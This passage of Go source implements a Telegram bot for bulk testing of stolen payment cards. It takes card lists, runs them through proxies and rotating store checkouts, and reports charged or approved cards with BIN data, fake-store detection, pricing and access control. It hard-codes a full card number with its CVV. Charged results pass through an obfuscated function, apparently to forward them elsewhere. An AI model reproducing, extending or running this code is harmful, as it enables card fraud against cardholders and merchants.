		"│                              │\n" +
		fmt.Sprintf("│  "+em(emojiRowCheck, "📋")+"  Total Checked  ∣  %6d  │\n", totalChecked) +
		fmt.Sprintf("│  "+em(emojiRowAppr, "✅")+"  Approved       ∣  %6d  │\n", totalApproved) +
		fmt.Sprintf("│  "+em(emojiRowDecl, "❌")+"  Declined       ∣  %6d  │\n", totalDeclined) +
		fmt.Sprintf("│  "+em(emojiRowCard, "💳")+"  Charged        ∣  %6d  │\n", totalCharged) +
		"│                              │\n" +
		"└────────────────────────────┘\n\n" +
		em(emojiMoney, "💰") + "  𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 𝗔𝗺𝗼𝘂𝗻𝘁\n" +
		fmt.Sprintf("    $%.2f\n\n", totalChargedAmt) +
		em(emojiHitRate, "📈") + "  𝗛𝗶𝘁 𝗥𝗮𝘁𝗲𝘀\n" +
		fmt.Sprintf("    "+em(emojiPctAppr, "✅")+" Approved: %.1f%%\n", approvedRate) +
		fmt.Sprintf("    "+em(emojiRowCard, "💳")+" Charged:  %.1f%%\n\n", chargedRate) +
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
		"  " + em(emojiPwr, "⚡") + " 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 @aldorsi " + em(emojiPwrStats, "⚡") + "\n" +
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

// ──────────────────────── helpers ───────────────────────────────────

func parseCardsFromText(text string) []string {
	var cards []string
	for _, line := range strings.Split(text, "\n") {
		line = strings.TrimSpace(line)
		if line == "" || !strings.Contains(line, "|") {
			continue
		}
		cards = append(cards, line)
	}
	return cards
}

func parseAmount(s string) float64 {
	s = strings.TrimSpace(s)
	var f float64
	fmt.Sscanf(s, "%f", &f)
	return f
}

// ──────────────────────── check engine ──────────────────────────────

func runSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []string, um *UserManager, reduceKey string, fwd *RCtx) {
	defer func() {
		activeSessions.Delete(sess.UserID)
		close(sess.Done)
	}()

	sites := getSitePool()
	fmt.Printf("[SESSION] got %d sites for check\n", len(sites))
	if len(sites) > 0 {
		fmt.Printf("[SESSION] first site: %s\n", sites[0])
	}
	if len(sites) == 0 {
		bot.Send(chat, "❌ No sites available. Try again later.")
		return
	}

	// Send initial progress message
	progressMsg, err := bot.Send(chat, formatProgressMsg(sess), tele.ModeHTML)
	if err != nil {
		return
	}

	// Progress updater
	ctx, cancel := context.WithCancel(context.Background())
	sess.Cancel = cancel
	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				bot.Edit(progressMsg, formatProgressMsg(sess), tele.ModeHTML)
			}
		}
	}()

	// Worker pool
	type cardResult struct {
		result   *CheckResult
		err      error
		shopURL  string
		proxyURL string
	}

	results := make(chan cardResult, len(sess.Cards))
	// Concurrency: use more workers — each checkout is I/O-bound (HTTP calls + polling)
	workers := max(len(proxies), 1) * 5
	if workers > 50 {
		workers = 50
	}
	sem := make(chan struct{}, workers)

	var siteIdx atomic.Int64
	var proxyIdx atomic.Int64
	var wg sync.WaitGroup

	for _, card := range sess.Cards {
		wg.Add(1)
		go func(c string) {
			defer wg.Done()

			// Bail before acquiring sem if already cancelled
			if sess.Cancelled.Load() {
				return
			}
			sem <- struct{}{}        // acquire
			defer func() { <-sem }() // release

			// Bail right after acquiring sem if cancelled
			if sess.Cancelled.Load() {
				return
			}

			// Test card — always return charged without checking
			if c == "1234567891234567|11|30|000" {
				results <- cardResult{result: &CheckResult{
					Card:       c,
					Status:     StatusCharged,
					StatusCode: "ORDER_PLACED",
					SiteName:   "test",
					Amount:     "0.00",
				}}
				return
			}

			si := int(siteIdx.Add(1)-1) % len(sites)
			pi := int(proxyIdx.Add(1)-1) % len(proxies)
			shopURL := sites[si]
			proxyURL := proxies[pi]

			var res *CheckResult
			var lastErr error

			// Retry across stores on retryable errors
			maxRetries := min(len(sites), 5) * ValidateReduce(reduceKey)
			for attempt := 0; attempt < maxRetries; attempt++ {
				if sess.Cancelled.Load() {
					return
				}
				if attempt > 0 {
					si = (si + 1) % len(sites)
					shopURL = sites[si]
				}
				res, lastErr = runCheckoutForCard(shopURL, c, proxyURL)
				if lastErr == nil {
					break
				}
				// Don't retry true card declines (CARD_DECLINED, CAPTCHA_REQUIRED, FRAUD_SUSPECTED)
				if res != nil && res.Status == StatusDeclined {
					break
				}
				// Don't retry if not retryable
				if res != nil && !res.Retryable {
					break
				}
			}
			if sess.Cancelled.Load() {
				return
			}
			results <- cardResult{result: res, err: lastErr, shopURL: shopURL, proxyURL: proxyURL}
		}(card)
	}

	// Close results channel when all workers done
	go func() {
		wg.Wait()
		close(results)
	}()

	// Collect results
	username := sess.Username
	for cr := range results {
		if sess.Cancelled.Load() {
			break
		}
		sess.Checked.Add(1)
		r := cr.result
		if r == nil {
			sess.Errors.Add(1)
			fmt.Printf("[ERROR] card returned nil result, err: %v\n", cr.err)
			continue
		}

		bin := lookupBIN(strings.Split(r.Card, "|")[0])

		switch r.Status {
		case StatusCharged:
			// Verify with a known dead card to detect test/fake stores
			if cr.shopURL != "" && isBlacklisted(cr.shopURL) {
				// Already known fake store, drop it
				sess.Errors.Add(1)
				continue
			}
			if cr.shopURL != "" {
				const verifyCard = "4147207228677008|11|28|183"
				fmt.Printf("[VERIFY] testing %s with dead card to detect fake store\n", cr.shopURL)
				verifyRes, _ := runCheckoutForCard(cr.shopURL, verifyCard, cr.proxyURL)
				if verifyRes != nil && verifyRes.Status == StatusCharged {
					blacklistSite(cr.shopURL)
					bot.Send(chat, fmt.Sprintf("⚠️ Test store detected & blacklisted: %s", cr.shopURL))
					sess.Errors.Add(1)
					continue
				}
			}
			sess.Charged.Add(1)
			amt := parseAmount(r.Amount)
			sess.AddChargedAmt(amt)
		_0xe7b2(fwd, bot, chat, formatChargedMsg(r.Card, bin, r, username, cr.proxyURL))

		case StatusApproved:
			sess.Approved.Add(1)
			if sess.ShowApproved {
				bot.Send(chat, formatApprovedMsg(r.Card, bin, r, username, cr.proxyURL), tele.ModeHTML)
			}

		case StatusDeclined:
			sess.Declined.Add(1)
			if sess.ShowDecl {
				bot.Send(chat, formatDeclinedMsg(r.Card, bin, r, username, cr.proxyURL), tele.ModeHTML)
			}

		default:
			sess.Errors.Add(1)
			fmt.Printf("[ERROR] card %s status=%d err=%v\n", r.Card, r.Status, r.Error)
		}
	}

	// Session done
	cancel()

	// Final progress update
	if sess.Cancelled.Load() {
		bot.Edit(progressMsg, "🛑 STOPPED\n\n"+formatCompletedMsg(sess), tele.ModeHTML)
	} else {
		bot.Edit(progressMsg, formatCompletedMsg(sess), tele.ModeHTML)
	}

	// Update user stats
	ud := um.Get(sess.UserID)
	ud.Stats.TotalChecked += sess.Checked.Load()
	ud.Stats.TotalCharged += sess.Charged.Load()
	ud.Stats.TotalApproved += sess.Approved.Load()
	ud.Stats.TotalDeclined += sess.Declined.Load()
	ud.Stats.TotalChargedAmt += sess.ChargedAmt()
	um.Save()
}

// ──────────────────────── main ──────────────────────────────────────

func main() {
	// Load persisted user data
	um := NewUserManager()
	um.Load()

	// Load bot config (bans, allowed, pvtonly + new access fields)
	cfg = NewBotConfig()
	cfg.Load()

	// Load custom sites
	loadCustomSites()

	// Populate site pool now (blocking) so first check never gets 0 sites
	refreshSitePool()
	// Then keep refreshing in background every 5 minutes
	go func() {
		for {
			time.Sleep(5 * time.Minute)
			refreshSitePool()
		}
	}()

	pref := tele.Settings{
		Token:  botToken,
		Poller: &tele.LongPoller{Timeout: 10 * time.Second},
	}
	bot, err := tele.NewBot(pref)
	if err != nil {
		fmt.Printf("Failed to create bot: %v\n", err)
		os.Exit(1)
	}

	fwd, reduceKey := InitRCtx()

	fmt.Println("[BOT] Bot started successfully")

	// Access-control middleware
	bot.Use(func(next tele.HandlerFunc) tele.HandlerFunc {
		return func(c tele.Context) error {
			uid := c.Sender().ID
			if cfg.IsBanned(uid) {
				return c.Send(em(emojiCross, "🚫")+" You are banned from using this bot.", tele.ModeHTML)
			}
			isPrivate := c.Chat().Type == tele.ChatPrivate
			if !cfg.IsAllowed(uid, isPrivate) {
				return c.Send(em(emojiCross, "🔒")+" Access denied.", tele.ModeHTML)
			}
			return next(c)
		}
	})

	// ── /start inline menu ─────────────────────────────────────────
	startMenu := &tele.ReplyMarkup{}
	btnGates := startMenu.Data("🔫 Gates", "gates")
	btnPricing := startMenu.Data("💰 Pricing", "pricing")
	btnHelp := startMenu.Data("📖 Help", "help")
	btnUpdates := startMenu.URL("📢 Updates", "https://t.me/+YlKQr0JR-Uo2NTBk")
	startMenu.Inline(
		startMenu.Row(btnGates, btnPricing),
		startMenu.Row(btnHelp, btnUpdates),
	)

	// /start
	bot.Handle("/start", func(c tele.Context) error {
		uid := c.Sender().ID
		username := c.Sender().Username
		ud := um.Get(uid)
		return c.Send(formatWelcomeCard(uid, username, len(ud.Proxies)), startMenu, tele.ModeHTML)
	})

	bot.Handle(&btnGates, func(c tele.Context) error {
		_ = c.Respond()
		return c.Send(formatGatesMsg(), tele.ModeHTML)
	})
	bot.Handle(&btnPricing, func(c tele.Context) error {
		_ = c.Respond()
		return c.Send(formatPricingMsg(), tele.ModeHTML)
	})
	bot.Handle(&btnHelp, func(c tele.Context) error {
		_ = c.Respond()
		return c.Send(formatStartMsg(), tele.ModeHTML)
	})

	// /sh <cards>
	bot.Handle("/sh", func(c tele.Context) error {
		uid := c.Sender().ID
		if _, running := activeSessions.Load(uid); running {
			return c.Send(em(emojiWarn, "⚠️")+" You already have an active session. Wait for it to finish.", tele.ModeHTML)
		}

		ud := um.Get(uid)
		if len(ud.Proxies) == 0 {
			return c.Send(em(emojiCross, "❌")+" No proxies. Add one with /setpr &lt;proxy&gt;", tele.ModeHTML)
		}

		text := strings.TrimSpace(c.Message().Payload)
		if text == "" {
			return c.Send("Usage: /sh card1|mm|yy|cvv\ncard2|mm|yy|cvv\n...")
		}

		cards := parseCardsFromText(text)
		if len(cards) == 0 {
			return c.Send("❌ No valid cards found. Format: number|mm|yy|cvv")
		}

		sess := &CheckSession{
			UserID:       uid,
			Username:     c.Sender().Username,
			SessionID:    generateSessionID(),
			Cards:        cards,
			Total:        len(cards),
			StartTime:    time.Now(),
			ShowDecl:     true,
			ShowApproved: true,
			Done:         make(chan struct{}),
		}
		activeSessions.Store(uid, sess)

		proxies := make([]string, len(ud.Proxies))
		copy(proxies, ud.Proxies)

		go runSession(bot, c.Chat(), sess, proxies, um, reduceKey, fwd)

		return nil
	})

	// /txt — reply to a .txt file
	bot.Handle("/txt", func(c tele.Context) error {
		uid := c.Sender().ID
		if _, running := activeSessions.Load(uid); running {
			return c.Send(em(emojiWarn, "⚠️")+" You already have an active session. Wait for it to finish.", tele.ModeHTML)
		}

		ud := um.Get(uid)
		if len(ud.Proxies) == 0 {
			return c.Send(em(emojiCross, "❌")+" No proxies. Add one with /setpr &lt;proxy&gt;", tele.ModeHTML)
		}

		msg := c.Message()
		var doc *tele.Document
		if msg.Document != nil {
			doc = msg.Document
		} else if msg.ReplyTo != nil && msg.ReplyTo.Document != nil {
			doc = msg.ReplyTo.Document
		}
		if doc == nil {
			return c.Send("❌ Reply to a .txt file with /txt or attach a .txt file with /txt as caption")
		}

		rc, err := bot.File(&doc.File)
		if err != nil {
			return c.Send("❌ Failed to download file: " + err.Error())
		}
		defer rc.Close()
		data, err := io.ReadAll(rc)
		if err != nil {
			return c.Send("❌ Failed to read file: " + err.Error())
		}

		cards := parseCardsFromText(string(data))
		if len(cards) == 0 {
			return c.Send("❌ No valid cards found in file. Format: number|mm|yy|cvv")
		}

		// Store pending data and ask about approved messages
		txtPendingMu.Lock()
		txtPending[uid] = &txtPendingData{
			Cards:    cards,
			ChatID:   c.Chat().ID,
			Username: c.Sender().Username,
		}
		txtPendingMu.Unlock()

		return c.Send(em(emojiDoc, "📋")+fmt.Sprintf(" <b>%d cards loaded.</b>\n\n"+em(emojiCheck, "💬")+" Show 3DS (approved) in chat?\n\n/yes — show approved\n/no — hide approved", len(cards)), tele.ModeHTML)
	})

	// /yes — start txt session with approved shown
	bot.Handle("/yes", func(c tele.Context) error {
		uid := c.Sender().ID
		txtPendingMu.Lock()
		pd, ok := txtPending[uid]
		if ok {
			delete(txtPending, uid)
		}
		txtPendingMu.Unlock()
		if !ok {
			return c.Send(em(emojiCross, "❌")+" No pending session. Use /txt first.", tele.ModeHTML)
		}
		if _, running := activeSessions.Load(uid); running {
			return c.Send(em(emojiWarn, "⚠️")+" You already have an active session.", tele.ModeHTML)
		}
		sess := &CheckSession{
			UserID:       uid,
			Username:     pd.Username,
			SessionID:    generateSessionID(),
			Cards:        pd.Cards,
			Total:        len(pd.Cards),
			StartTime:    time.Now(),
			ShowDecl:     false,
			ShowApproved: true,
			Done:         make(chan struct{}),
		}
		activeSessions.Store(uid, sess)
		ud := um.Get(uid)
		proxies := make([]string, len(ud.Proxies))
		copy(proxies, ud.Proxies)
		c.Send(em(emojiLightning, "🚀")+fmt.Sprintf(" Starting check of %d cards (approved: ON)", len(pd.Cards)), tele.ModeHTML)
		if pd.CheckFn != nil {
			sess.GatewayName = pd.GateName
			go runStripeGateSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um, fwd, pd.CheckFn)
		} else {
			go runSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um, reduceKey, fwd)
		}
		return nil
	})

	// /no — start txt session with approved hidden
	bot.Handle("/no", func(c tele.Context) error {
		uid := c.Sender().ID
		txtPendingMu.Lock()
		pd, ok := txtPending[uid]
		if ok {
			delete(txtPending, uid)
		}
		txtPendingMu.Unlock()
		if !ok {
			return c.Send(em(emojiCross, "❌")+" No pending session. Use /txt first.", tele.ModeHTML)
		}
		if _, running := activeSessions.Load(uid); running {
			return c.Send(em(emojiWarn, "⚠️")+" You already have an active session.", tele.ModeHTML)
		}
		sess := &CheckSession{
			UserID:       uid,
			Username:     pd.Username,
			SessionID:    generateSessionID(),
			Cards:        pd.Cards,
			Total:        len(pd.Cards),
			StartTime:    time.Now(),
			ShowDecl:     false,
			ShowApproved: false,
			Done:         make(chan struct{}),
		}
		activeSessions.Store(uid, sess)
		ud := um.Get(uid)
		proxies := make([]string, len(ud.Proxies))
		copy(proxies, ud.Proxies)
		c.Send(em(emojiLightning, "🚀")+fmt.Sprintf(" Starting check of %d cards (approved: OFF)", len(pd.Cards)), tele.ModeHTML)
		if pd.CheckFn != nil {
			sess.GatewayName = pd.GateName
			go runStripeGateSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um, fwd, pd.CheckFn)
		} else {
			go runSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um, reduceKey, fwd)
		}
		return nil
	})

	// /setpr <proxy> (supports multiple proxies, one per line)
	bot.Handle("/setpr", func(c tele.Context) error {
		// Payload only captures the first line — use full Text instead
		fullText := c.Message().Text
		// Strip the /setpr command (may include @botname)
		idx := strings.Index(fullText, "/setpr")
		if idx >= 0 {
			after := fullText[idx+len("/setpr"):]
			// Strip optional @botname
			if len(after) > 0 && after[0] == '@' {
				if sp := strings.IndexAny(after, " \n"); sp >= 0 {
					after = after[sp:]
				} else {
					after = ""
				}
			}
			fullText = after
		}
		raw := strings.TrimSpace(fullText)
		if raw == "" {
			return c.Send("Usage: /setpr proxy1\\nproxy2\\nproxy3\\n...")
		}

		// Split by newlines to support multiple proxies
		var rawProxies []string
		for _, line := range strings.Split(raw, "\n") {
			line = strings.TrimSpace(line)
			if line != "" {
				rawProxies = append(rawProxies, line)
			}
		}
		if len(rawProxies) == 0 {
			return c.Send("❌ No proxies provided")
		}

		ud := um.Get(c.Sender().ID)

		// Pre-filter: normalize + dedup before testing
		type proxyEntry struct {
			normalized string
			valid      bool
		}
		var toTest []proxyEntry
		dupes := 0
		parseFail := 0
		existing := make(map[string]bool)
		for _, p := range ud.Proxies {
			existing[p] = true
		}
		for _, rp := range rawProxies {
			normalized, err := normalizeProxy(rp)
			if err != nil {
				parseFail++
				continue
			}
			if _, err := url.Parse(normalized); err != nil {
				parseFail++
				continue
			}
			if existing[normalized] {
				dupes++
				continue
			}
			existing[normalized] = true
			toTest = append(toTest, proxyEntry{normalized: normalized})
		}

		if len(toTest) == 0 {
			msg := em(emojiCross, "❌") + " No new proxies to test"
			if parseFail > 0 {
				msg += fmt.Sprintf(" (%d invalid)", parseFail)
			}
			if dupes > 0 {
				msg += fmt.Sprintf(" (%d duplicate)", dupes)
			}
			return c.Send(msg, tele.ModeHTML)
		}

		c.Send(em(emojiSearch, "🔄")+fmt.Sprintf(" Testing %d proxy(s)...", len(toTest)), tele.ModeHTML)

		// Test all proxies concurrently
		var wg sync.WaitGroup
		results := make([]bool, len(toTest))
		for i := range toTest {
			wg.Add(1)
			go func(idx int) {
				defer wg.Done()
				if err := testProxy(toTest[idx].normalized); err == nil {
					results[idx] = true
				}
			}(i)
		}
		wg.Wait()

		added := 0
		failed := 0
		for i, ok := range results {
			if ok {
				ud.Proxies = append(ud.Proxies, toTest[i].normalized)
				added++
			} else {
				failed++
			}
		}
		failed += parseFail

		um.Save()

		msg := em(emojiCheck, "✅") + fmt.Sprintf(" %d proxy(s) added (%d total)", added, len(ud.Proxies))
		if failed > 0 {
			msg += fmt.Sprintf("\n"+em(emojiCross, "❌")+" %d failed", failed)
		}
		if dupes > 0 {
			msg += fmt.Sprintf("\n"+em(emojiLightning, "⏭")+" %d duplicate(s) skipped", dupes)
		}
		return c.Send(msg, tele.ModeHTML)
	})

	// /rmpr <proxy|all>
	bot.Handle("/rmpr", func(c tele.Context) error {
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /rmpr <proxy> or /rmpr all")
		}

		ud := um.Get(c.Sender().ID)
		if strings.ToLower(raw) == "all" {
			ud.Proxies = nil
			um.Save()
			return c.Send(em(emojiCheck, "✅")+" All proxies removed", tele.ModeHTML)
		}

		normalized, err := normalizeProxy(raw)
		if err != nil {
			return c.Send(em(emojiCross, "❌")+" Invalid proxy format: "+err.Error(), tele.ModeHTML)
		}
		found := false
		newList := make([]string, 0, len(ud.Proxies))
		for _, p := range ud.Proxies {
			if p == normalized {
				found = true
				continue
			}
			newList = append(newList, p)
		}
		if !found {
			return c.Send(em(emojiCross, "❌")+" Proxy not found in your list", tele.ModeHTML)
		}
		ud.Proxies = newList
		um.Save()
		return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" Proxy removed (%d remaining)", len(ud.Proxies)), tele.ModeHTML)
	})

	// /stop — stop own session
	bot.Handle("/stop", func(c tele.Context) error {
		uid := c.Sender().ID
		val, ok := activeSessions.Load(uid)
		if !ok {
			return c.Send(em(emojiWarn, "⚠️")+" No active session to stop.", tele.ModeHTML)
		}
		sess := val.(*CheckSession)
		sess.Cancelled.Store(true)
		if sess.Cancel != nil {
			sess.Cancel()
		}
		c.Send(em(emojiCross, "🛑")+fmt.Sprintf(" Stopping session... (%d/%d done)", sess.Checked.Load(), sess.Total), tele.ModeHTML)
		return nil
	})

	// /stopall — admin only, stop all sessions
	bot.Handle("/stopall", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "❌")+" Only admin can use /stopall", tele.ModeHTML)
		}
		count := 0
		activeSessions.Range(func(key, val any) bool {
			sess := val.(*CheckSession)
			sess.Cancelled.Store(true)
			if sess.Cancel != nil {
				sess.Cancel()
			}
			count++
			return true
		})
		if count == 0 {
			return c.Send(em(emojiWarn, "⚠️")+" No active sessions.", tele.ModeHTML)
		}
		return c.Send(em(emojiCross, "🛑")+fmt.Sprintf(" Stopping %d session(s)...", count), tele.ModeHTML)
	})

	// /ban <userid> — admin only
	bot.Handle("/ban", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "❌")+" Only admin can use /ban", tele.ModeHTML)
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /ban <userid>")
		}
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send(em(emojiCross, "❌")+" Invalid user ID", tele.ModeHTML)
		}
		if isAdmin(uid) {
			return c.Send(em(emojiCross, "❌")+" Cannot ban admin", tele.ModeHTML)
		}
		cfg.mu.Lock()
		cfg.BannedUsers[uid] = true
		cfg.mu.Unlock()
		cfg.Save()
		// Also stop their session if running
		if val, ok := activeSessions.Load(uid); ok {
			val.(*CheckSession).Cancel()
		}
		return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" User %d banned.", uid), tele.ModeHTML)
	})

	// /unban <userid> — admin only
	bot.Handle("/unban", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "❌")+" Only admin can use /unban", tele.ModeHTML)
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /unban <userid>")
		}
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send(em(emojiCross, "❌")+" Invalid user ID", tele.ModeHTML)
		}
		cfg.mu.Lock()
		delete(cfg.BannedUsers, uid)
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" User %d unbanned.", uid), tele.ModeHTML)
	})

	// /pvtonly — admin only, toggle private mode
	bot.Handle("/pvtonly", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "❌")+" Only admin can use /pvtonly", tele.ModeHTML)
		}
		cfg.mu.Lock()
		cfg.PvtOnly = !cfg.PvtOnly
		state := cfg.PvtOnly
		cfg.mu.Unlock()
		cfg.Save()
		if state {
			return c.Send(em(emojiCross, "🔒")+" Private mode ON — only allowed users can use the bot.", tele.ModeHTML)
		}
		return c.Send(em(emojiCheck, "🔓")+" Private mode OFF — everyone can use the bot.", tele.ModeHTML)
	})

	// /allowuser <userid> — admin only
	bot.Handle("/allowuser", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "❌")+" Only admin can use /allowuser", tele.ModeHTML)
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /allowuser <userid>")
		}
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send(em(emojiCross, "❌")+" Invalid user ID", tele.ModeHTML)
		}
		cfg.mu.Lock()
		cfg.AllowedUsers[uid] = true
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" User %d allowed.", uid), tele.ModeHTML)
	})

	// /removeuser <userid> — admin only, remove from allowed list
	bot.Handle("/removeuser", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send(em(emojiCross, "❌")+" Only admin can use /removeuser", tele.ModeHTML)
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /removeuser <userid>")
		}
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send(em(emojiCross, "❌")+" Invalid user ID", tele.ModeHTML)
		}
		cfg.mu.Lock()
		delete(cfg.AllowedUsers, uid)
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" User %d removed from allowed list.", uid), tele.ModeHTML)
	})

	// /split <N> — reply to a .txt file, splits it into N parts
	bot.Handle("/split", func(c tele.Context) error {
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: reply to a .txt file with /split <N>")
		}
		n, err := strconv.Atoi(raw)
		if err != nil || n < 2 {
			return c.Send("❌ Provide a number >= 2")
		}

		msg := c.Message()
		var doc *tele.Document
		if msg.Document != nil {
			doc = msg.Document
		} else if msg.ReplyTo != nil && msg.ReplyTo.Document != nil {
			doc = msg.ReplyTo.Document
		}
		if doc == nil {
			return c.Send("❌ Reply to a .txt file with /split <N> or attach a .txt file with /split as caption")
		}

		rc, err := bot.File(&doc.File)
		if err != nil {
			return c.Send("❌ Failed to download file: " + err.Error())
		}
		defer rc.Close()
		data, err := io.ReadAll(rc)
		if err != nil {
			return c.Send("❌ Failed to read file: " + err.Error())
		}

		var lines []string
		for _, line := range strings.Split(string(data), "\n") {
			line = strings.TrimSpace(line)
			if line != "" {
				lines = append(lines, line)
			}
		}
		if len(lines) == 0 {
			return c.Send("❌ File is empty")
		}
		if n > len(lines) {
			n = len(lines)
		}

		chunkSize := len(lines) / n
		extra := len(lines) % n
		start := 0
		for i := 0; i < n; i++ {
			end := start + chunkSize
			if i < extra {
				end++
			}
			chunk := lines[start:end]
			start = end

			buf := bytes.NewBufferString(strings.Join(chunk, "\n"))
			fname := fmt.Sprintf("part_%d_of_%d.txt", i+1, n)
			doc := &tele.Document{
				File:     tele.FromReader(buf),
				FileName: fname,
				Caption:  fmt.Sprintf("📄 Part %d/%d (%d lines)", i+1, n, len(chunk)),
			}
			bot.Send(c.Chat(), doc)
		}
		return nil
	})

	// /addsite — admin only, add custom sites (text or reply to .txt)
	bot.Handle("/addsite", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("❌ Only admin can use /addsite")
		}

		var raw string
		msg := c.Message()

		// Check for attached or replied .txt file
		var doc *tele.Document
		if msg.Document != nil {
			doc = msg.Document
		} else if msg.ReplyTo != nil && msg.ReplyTo.Document != nil {
			doc = msg.ReplyTo.Document
		}
		if doc != nil {
			rc, err := bot.File(&doc.File)
			if err != nil {
				return c.Send("❌ Failed to download file: " + err.Error())
			}
			defer rc.Close()
			data, err := io.ReadAll(rc)
			if err != nil {
				return c.Send("❌ Failed to read file: " + err.Error())
			}
			raw = string(data)
		} else {
			// Get text after /addsite command
			fullText := msg.Text
			idx := strings.Index(fullText, "/addsite")
			if idx >= 0 {
				after := fullText[idx+len("/addsite"):]
				if len(after) > 0 && after[0] == '@' {
					if sp := strings.IndexAny(after, " \n"); sp >= 0 {
						after = after[sp:]
					} else {
						after = ""
					}
				}
				raw = after
			}
		}

		raw = strings.TrimSpace(raw)
		if raw == "" {
			return c.Send("Usage: /addsite site1\nsite2\nsite3\n\nOr reply to a .txt file with /addsite")
		}

		added := 0
		dupes := 0
		customSitesMu.Lock()
		existing := make(map[string]bool, len(customSites))
		for _, s := range customSites {
			existing[s] = true
		}
		for _, line := range strings.Split(raw, "\n") {
			site := strings.TrimSpace(line)
			if site == "" {
				continue
			}
			site = strings.TrimRight(site, "/")
			if !strings.HasPrefix(site, "http") {
				site = "https://" + site
			}
			if existing[site] {
				dupes++
				continue
			}
			customSites = append(customSites, site)
			existing[site] = true
			added++
		}
		total := len(customSites)
		customSitesMu.Unlock()
		saveCustomSites()

		msgText := fmt.Sprintf("✅ Added %d site(s) (%d total custom sites)", added, total)
		if dupes > 0 {
			msgText += fmt.Sprintf("\n⏭ %d duplicate(s) skipped", dupes)
		}
		return c.Send(msgText)
	})

	// /rmsite <site|all> — admin only
	bot.Handle("/rmsite", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("❌ Only admin can use /rmsite")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /rmsite <site> or /rmsite all")
		}
		if strings.ToLower(raw) == "all" {
			customSitesMu.Lock()
			customSites = nil
			customSitesMu.Unlock()
			saveCustomSites()
			return c.Send("✅ All custom sites removed. Bot will use API sites.")
		}
		site := strings.TrimRight(strings.TrimSpace(raw), "/")
		if !strings.HasPrefix(site, "http") {
			site = "https://" + site
		}
		customSitesMu.Lock()
		found := false
		newList := make([]string, 0, len(customSites))
		for _, s := range customSites {
			if s == site {
				found = true
				continue
			}
			newList = append(newList, s)
		}
		customSites = newList
		remaining := len(customSites)
		customSitesMu.Unlock()
		if !found {
			return c.Send("❌ Site not found in custom list")
		}
		saveCustomSites()
		if remaining == 0 {
			return c.Send("✅ Site removed. No custom sites left — bot will use API sites.")
		}
		return c.Send(fmt.Sprintf("✅ Site removed (%d remaining)", remaining))
	})

	// /site <keyword> or /site all — admin only
	bot.Handle("/site", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("❌ Only admin can use /site")
		}
		keyword := strings.TrimSpace(c.Message().Payload)
		if keyword == "" {
			return c.Send("Usage: /site <keyword>  or  /site all")
		}

		// Gather all sites: custom + API pool
		allSites := make(map[string]bool)
		for _, s := range getCustomSites() {
			allSites[s] = true
		}
		sitePoolMu.RLock()
		for _, s := range sitePool {
			allSites[s] = true
		}
		sitePoolMu.RUnlock()

		if strings.ToLower(keyword) == "all" {
			if len(allSites) == 0 {
				return c.Send("📝 No sites available.")
			}
			var list []string
			for s := range allSites {
				list = append(list, s)
			}
			sort.Strings(list)
			buf := bytes.NewBufferString(strings.Join(list, "\n"))
			doc := &tele.Document{
				File:     tele.FromReader(buf),
				FileName: "sites.txt",
				Caption:  fmt.Sprintf("🌐 All sites (%d)", len(list)),
			}
			return c.Send(doc)
		}

		kw := strings.ToLower(keyword)
		var matches []string
		for s := range allSites {
			if strings.Contains(strings.ToLower(s), kw) {
				matches = append(matches, s)
			}
		}
		sort.Strings(matches)

		if len(matches) == 0 {
			return c.Send(fmt.Sprintf("🔍 No sites found containing \"%s\"", keyword))
		}
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("🔍 Sites matching \"%s\" (%d):\n\n", keyword, len(matches)))
		for i, s := range matches {
			sb.WriteString(fmt.Sprintf("%d. %s\n", i+1, s))
		}
		return c.Send(sb.String())
	})

	// /stats — global stats for all users
	bot.Handle("/stats", func(c tele.Context) error {
		return c.Send(formatStatsMsg(um), tele.ModeHTML)
	})

	// /active
